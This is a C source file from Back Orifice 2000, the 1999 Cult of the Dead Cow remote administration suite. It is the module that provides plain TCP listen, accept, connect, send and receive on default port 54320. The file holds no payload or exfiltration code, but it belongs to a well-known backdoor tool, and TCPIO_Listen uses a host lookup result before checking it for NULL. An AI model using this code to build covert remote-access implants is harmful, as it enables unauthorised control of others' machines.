/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#include<windows.h>
#include<winsock.h>
#include<iohandler.h>
#include<io_simpletcp.h>
#include<config.h>
#include<strhandle.h>

static IO_HANDLER g_TCPIOH;
	
typedef struct __tcpsocket {
	SOCKET s;
	SOCKADDR_IN rmt;
	char svConnectAddr[256];
} TCPSOCKET;

static char g_svTCPIOConfig[]="<**CFG**>TCPIO\0"
                       "N[0,65535]:Default Port=54320\0";
	
// Proper linkage type

IO_HANDLER *GetSimpleTcpIOHandler(void);

int _cdecl TCPIO_Insert(void)
{
	// Initialize Winsock 1.1
	WSADATA wsaData;
	if(WSAStartup(MAKEWORD(1,1), &wsaData)!=0) return -1;
	if(LOBYTE(wsaData.wVersion)!=1 || HIBYTE(wsaData.wVersion)!=1) {
		WSACleanup();
		return -1;
	}
	
	return 0;
}

int _cdecl TCPIO_Remove(void)
{
	// Clean up Winsock 1.1
	WSACleanup();
	return 0;
}

void * _cdecl TCPIO_Listen(char *svTarget)
{
	TCPSOCKET *tcps;

	// Get listen port
	struct in_addr bindAddr;
	bindAddr.S_un.S_addr=INADDR_ANY;
	int nPort=0;

	if(svTarget==NULL) nPort=GetCfgNum(g_svTCPIOConfig,"Default Port");	
	else if(lstrcmpi(svTarget,"RANDOM")!=0) {
		char svAdr[260],*svPort;
		lstrcpyn(svAdr,svTarget,260);
		svPort=BreakString(svAdr,":");
		if(svPort==NULL) {
			nPort=atoi(svAdr);
		} else {
			bindAddr.S_un.S_addr=inet_addr(svAdr);
			nPort=atoi(svPort);
		}
	}
	
	// Create listener socket
	SOCKET s;
	s=socket(PF_INET,SOCK_STREAM,IPPROTO_TCP);
	if(s==INVALID_SOCKET) return NULL;
	
	BOOL sopt;
	sopt=TRUE;
	setsockopt(s,IPPROTO_TCP,TCP_NODELAY,(char *)&sopt,sizeof(BOOL));
	sopt=TRUE;
	setsockopt(s,SOL_SOCKET,SO_DONTLINGER,(char *)&sopt,sizeof(BOOL));
	
	// Bind socket and listen
	SOCKADDR_IN saddr;
	memset(&saddr,0,sizeof(SOCKADDR_IN));
	saddr.sin_addr=bindAddr;
	saddr.sin_family=AF_INET;
	saddr.sin_port=htons((WORD)nPort);
	
	if(bind(s,(SOCKADDR *) &saddr,sizeof(SOCKADDR_IN))==SOCKET_ERROR) {
		closesocket(s);
		return NULL;
	}
	if(listen(s,SOMAXCONN)!=0) {
		closesocket(s);
		return NULL;
	}
	
	int namelen=sizeof(SOCKADDR_IN);
	getsockname(s,(SOCKADDR *)&saddr,&namelen);

	// Allocate state structure
	tcps=(TCPSOCKET *)malloc(sizeof(TCPSOCKET));
	if(tcps==NULL) {
		closesocket(s);
		return NULL;
	}

	// Fill in state structure
	tcps->s=s;
	memset(&(tcps->rmt),0,sizeof(SOCKADDR_IN));
	
	// Get connect address
	if(bindAddr.S_un.S_addr==INADDR_ANY) {
		char svHostName[256];
		struct hostent *he;
		struct in_addr *pAddr;
		gethostname(svHostName,256);
		he=gethostbyname(svHostName);
		pAddr=(struct in_addr *)he->h_addr_list[0];
		if(he) {
			wsprintf(tcps->svConnectAddr,"%u.%u.%u.%u:%u",pAddr->S_un.S_un_b.s_b1,pAddr->S_un.S_un_b.s_b2,pAddr->S_un.S_un_b.s_b3,pAddr->S_un.S_un_b.s_b4,ntohs(saddr.sin_port));
		} else {
			lstrcpyn(tcps->svConnectAddr,"No Connect Addr",256);
		}
	} else {
		lstrcpyn(tcps->svConnectAddr,svTarget,256);
	}
	return tcps;
}

void * _cdecl TCPIO_Accept(void *data, char *svAddr, int nMaxLen)
{
	// Check to see if this is a listening socket
	TCPSOCKET *tcps=(TCPSOCKET *)data;
	
	// Check for connection
	fd_set rdfds;
	TIMEVAL tm;

	FD_ZERO(&rdfds);
	FD_SET(tcps->s,&rdfds);
	
	tm.tv_sec=0;
	tm.tv_usec=0;

	if(select(0,&rdfds,NULL,NULL,&tm)<=0) {
		return 0;
	}

	// Accept socket
	SOCKADDR_IN saddr;
	int len=sizeof(SOCKADDR_IN);
	SOCKET accs;

	accs=accept(tcps->s,(SOCKADDR *)&saddr,&len);
	if(accs==INVALID_SOCKET) return NULL;

	BOOL sopt;
	sopt=TRUE;
	setsockopt(accs,IPPROTO_TCP,TCP_NODELAY,(char *)&sopt,sizeof(BOOL));
	sopt=TRUE;
	setsockopt(accs,SOL_SOCKET,SO_DONTLINGER,(char *)&sopt,sizeof(BOOL));
	
	TCPSOCKET *acc_ios=(TCPSOCKET *)malloc(sizeof(TCPSOCKET));
	if(acc_ios==NULL) {
		closesocket(accs);
		return NULL;
	}

	acc_ios->s=accs;
	acc_ios->rmt=saddr;
	
	if(nMaxLen>16) {
		wsprintf(svAddr,"%3u.%3u.%3u.%3u",
			saddr.sin_addr.S_un.S_un_b.s_b1,
			saddr.sin_addr.S_un.S_un_b.s_b2,
			saddr.sin_addr.S_un.S_un_b.s_b3,
			saddr.sin_addr.S_un.S_un_b.s_b4);
	}
		
	return acc_ios;
}

void * _cdecl TCPIO_Connect(char *svTarget)
{
	// Create socket
	SOCKET s;
	s=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if(s==INVALID_SOCKET) return NULL;

	BOOL sopt;
	sopt=TRUE;
	setsockopt(s,IPPROTO_TCP,TCP_NODELAY,(char *)&sopt,sizeof(BOOL));
	sopt=TRUE;
	setsockopt(s,SOL_SOCKET,SO_DONTLINGER,(char *)&sopt,sizeof(BOOL));
	

	// Get target port
	int nPort;
	char svHost[256],*ptr;
	lstrcpyn(svHost,svTarget,256);
	for(ptr=svHost;((*ptr)!=':') && ((*ptr)!=NULL);ptr++);
	if((*ptr)==':') {
		*ptr='\0';
		ptr++;
		nPort=atoi(ptr);
	}
	else nPort=GetCfgNum(g_svTCPIOConfig,"Default Port");

	// Resolve hostname
	DWORD addr;
	if((addr=inet_addr(svHost))==INADDR_NONE) {
		struct hostent *he=gethostbyname(svHost);
		if(he==NULL) {
			closesocket(s);
			return NULL;
		}
		addr=*(DWORD *)(he->h_addr_list[0]);
	}

	// Create socket address
	SOCKADDR_IN saddr;
	memset(&saddr,0,sizeof(SOCKADDR_IN));
	saddr.sin_addr.S_un.S_addr=addr;
	saddr.sin_family=AF_INET;
	saddr.sin_port=htons((WORD)nPort);
	
	// Connect to remote host
	if(connect(s,(SOCKADDR *)&saddr,sizeof(SOCKADDR_IN))!=0) {
		closesocket(s);
		return NULL;
	}
	
	// Allocate internal state structure
	TCPSOCKET *tcps=(TCPSOCKET *)malloc(sizeof(TCPSOCKET));
	if(tcps==NULL) {
		closesocket(s);
		return NULL;
	}
	
	tcps->s=s;
	tcps->rmt=saddr;
	
	return tcps;
}

int _cdecl TCPIO_Close(void *ios)
{
	TCPSOCKET *tcps=(TCPSOCKET *)ios;
	
	closesocket(tcps->s);

	free(tcps);
	return 0;
}

char * _cdecl TCPIO_Query(void)
{
	return "TCPIO: Back Orifice TCP IO Module v1.0";
}

int _cdecl TCPIO_Recv(void *data, BYTE **pInData, int *pnInDataLen)
{
	TCPSOCKET *tcps=(TCPSOCKET *)data;
	
	// Check socket for readability 
	TIMEVAL tv;
	int nRet;
	tv.tv_sec=0;
	tv.tv_usec=0;
	fd_set rfds;
	FD_ZERO(&rfds);
	FD_SET(tcps->s,&rfds);
	nRet=select(1,&rfds,NULL,NULL,&tv);
	if(nRet==SOCKET_ERROR) return -1;
	if(nRet==0) return 0;

	// Get length of rest of data
	DWORD nPktLen;
	int lenret;
	lenret=recv(tcps->s,(char *)&nPktLen,sizeof(DWORD),MSG_PEEK);
	if(lenret<=0) return -1;
	if(lenret<sizeof(DWORD)) 
		return 0;

	// Make sure we have the rest of the packet
	DWORD len;
	if(ioctlsocket(tcps->s,FIONREAD,&len)==SOCKET_ERROR) 
		return -1;

	if(len<(sizeof(DWORD)+nPktLen)) 
		return 0;

	// Clear off the header
	lenret=recv(tcps->s,(char *)&nPktLen,sizeof(DWORD),0);
	if(lenret<sizeof(DWORD)) 
		return -1;
	
	// Allocate buffer for data
	BYTE *buf=(BYTE *)malloc(nPktLen);
	if(buf==NULL) {
		*pInData=NULL;
		*pnInDataLen=0;
		return -1;
	}

	// Receive data
	char *pbuf=(char *)buf;
	int count=nPktLen;
	do {
		lenret=recv(tcps->s,pbuf,count,0);
		if(lenret==SOCKET_ERROR) {
			free(buf);
			*pInData=NULL;
			*pnInDataLen=0;
			return -1;
		}
		count-=lenret;
		pbuf+=lenret;
		if(count>0) Sleep(20);
	} while(count>0);

	// Pass data back to application
	*pInData=buf;
	*pnInDataLen=nPktLen;
	return 1;
}

int _cdecl TCPIO_Send(void *data, BYTE *pData, int nDataLen)
{
	TCPSOCKET *tcps=(TCPSOCKET *)data;

	// Make single packet
	void *pkt=malloc(sizeof(int)+nDataLen);
	if(pkt==NULL) 
		return -1;

	// Send packet length
	memcpy(pkt,&nDataLen,sizeof(int));
	memcpy((BYTE *)pkt+sizeof(int),pData,nDataLen);
	
	// Send packet
	int ret;
	TIMEVAL tm;
	fd_set wfds;
	FD_ZERO(&wfds);
	FD_SET(tcps->s,&wfds);
	tm.tv_sec=5;
	tm.tv_usec=0;
	if((ret=select(0,NULL,&wfds,NULL,&tm))>0) {
		char *ppkt=(char *)pkt;
		int count=nDataLen+sizeof(int);
		do {
			ret=send(tcps->s,ppkt,count,0);
			if(ret==SOCKET_ERROR) break;

			count-=ret;
			ppkt+=ret;
			if(count>0) Sleep(20);
		} while(count>0);
		free(pkt);
		if(ret==SOCKET_ERROR) return -1;
		return 1;
	}
	free(pkt);
	return ret;
}

void _cdecl TCPIO_Free(void *data, BYTE *pBuffer)
{
	if(pBuffer==NULL) return;
	free(pBuffer);
}

int _cdecl TCPIO_GetConnectAddr(void *data, char *svAddr, int nMaxLen)
{
	TCPSOCKET *tcps=(TCPSOCKET *)data;

	if(nMaxLen>256) nMaxLen=256;
	if(nMaxLen<0) return -1;
	lstrcpyn(svAddr,tcps->svConnectAddr,nMaxLen);
	return 0;
}

IO_HANDLER *GetSimpleTcpIOHandler(void)
{	
	g_TCPIOH.pClose=TCPIO_Close;
	g_TCPIOH.pConnect=TCPIO_Connect;
	g_TCPIOH.pFree=TCPIO_Free;
	g_TCPIOH.pListen=TCPIO_Listen;
	g_TCPIOH.pAccept=TCPIO_Accept;
	g_TCPIOH.pQuery=TCPIO_Query;
	g_TCPIOH.pRecv=TCPIO_Recv;
	g_TCPIOH.pInsert=TCPIO_Insert;
	g_TCPIOH.pRemove=TCPIO_Remove;
	g_TCPIOH.pSend=TCPIO_Send;
	g_TCPIOH.pGetConnectAddr=TCPIO_GetConnectAddr;

	return &g_TCPIOH;
}
